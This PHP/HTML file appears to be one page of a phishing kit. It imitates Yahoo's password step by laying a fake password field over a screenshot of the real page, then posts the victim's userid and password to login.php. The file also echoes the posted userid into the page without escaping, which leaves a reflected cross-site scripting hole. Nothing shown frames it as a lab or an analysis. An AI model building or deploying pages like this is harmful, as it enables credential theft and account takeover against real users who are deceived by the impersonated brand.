<?php

$userid = $_POST["userid"];

?>

<!DOCTYPE html>
<html>
<head>
	<link rel="shortcut icon" href="media/favicon.ico" />
	<title>Yahoo - Login</title>
	<style>
		body  {
			background-image: url("media/yahoo_password.png");
		}


		.login {
		position:absolute;
		left: 860px;
		top: 215px;
		width: 287px;
		height: 30px;
		border: 0;
		font-size: 16px;
		font-style: bold;
		padding-bottom: 15px;
		padding: 7px;
		margin: 5px 0;
		border-bottom: 2px solid #4289f4;
		box-shadow: none;
		}

		.button {
		position:absolute;
		left: 860px;
		top: 285px;
		border: blue; 
		background-color: #4289f4;
		font-style: bold;
		font-size: 13px;
		color: white;
		cursor: pointer;
		width: 300px;
		height: 40px;
		}

		.button:hover {
			color: #effdff;
			box-shadow: 1px 1px 1px #a9cff2;
		}

		.sign_in_text {
		position:absolute;
		left: 870px;
		top: 150px;
		width: 287px;
		height: 30px;
		border: 0;
		font-size: 18px;
		font-style: bold;
		}

	</style>
</head>
<body>

	<form id="FormDated" name="FormDated" method="post" action="login.php">
	<input type="hidden" name="userid" value="<?php echo $userid; ?>">

		<p class="sign_in_text">Hello <?php echo $userid; ?></p>

		<input class="login" name="password" type="password" id="password" size="45" placeholder="Enter your password" maxlength="50" required>
		</input>

		<input class="button" type="submit" value="Sign in"/>

	</form>

</body>
</html>